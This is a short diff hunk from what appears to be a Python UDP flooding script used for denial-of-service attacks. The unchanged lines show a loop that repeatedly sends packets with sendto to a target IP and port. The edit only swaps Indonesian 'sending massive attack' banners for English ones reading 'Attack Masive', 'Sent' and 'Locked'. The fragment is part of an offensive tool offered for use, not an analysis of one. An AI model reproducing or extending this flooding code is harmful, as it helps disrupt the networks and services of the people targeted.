@@ -82,9 +82,9 @@ while True:
         addr = (str(ip),int(port))
         for x in range(times):
            s.sendto(data,addr)
-	   print("\033[95m[\033[97m+\033[95m] \033[91mMengirim  \033[99mSerangan  \033[33mMasive:::... " +ip+ " \033[0m")
-	   print("\033[95m[\033[97m+\033[95m] \033[97mMengirim  \033[95mSerangan  \033[32mMasive:::... " +ip+ " \033[0m")
-	   print("\033[95m[\033[97m+\033[95m] \033[92mMengirim  \033[96mSerangan  \033[31mMasive:::... " +ip+ " \033[0m")
+	   print("\033[95m[\033[97m+\033[95m] \033[91mAttack  \033[33mMasive:::... " +ip+ " \033[0m")
+	   print("\033[95m[\033[97m+\033[95m] \033[97mSent:::::::::::::........... " +ip+ " \033[0m")
+	   print("\033[95m[\033[97m+\033[95m] \033[92mLocked:::::::::::........... " +ip+ " \033[0m")
     except:
 	   print("\033[33m[\033[95m!\033[33m] Error!")
                          
